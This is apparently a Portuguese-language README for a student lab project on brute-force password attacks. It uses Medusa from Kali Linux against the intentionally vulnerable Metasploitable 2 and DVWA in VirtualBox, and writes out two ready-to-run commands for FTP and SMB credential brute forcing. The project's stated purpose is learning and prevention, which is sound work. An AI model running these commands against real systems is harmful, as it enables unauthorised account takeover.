
# Projeto de Força Bruta com Medusa

Este repositório contém testes simples de força bruta usando Kali Linux, Medusa e ambientes vulneráveis como Metasploitable 2 e DVWA.

## Conteúdo
- wordlists/ → arquivos de usuários e senhas
- scripts/ → scripts .sh para ataques FTP e SMB
- images/ → prints do VirtualBox e testes
- README.md

## Comandos usados
### Ataque FTP
medusa -h 192.168.56.20 -u msfadmin -P wordlists/passwords.txt -M ftp

### Ataque SMB
medusa -h 192.168.56.20 -U wordlists/users.txt -p msfadmin -M smbnt

## Objetivo
Aprender como ataques de força bruta funcionam e entender medidas de prevenção.
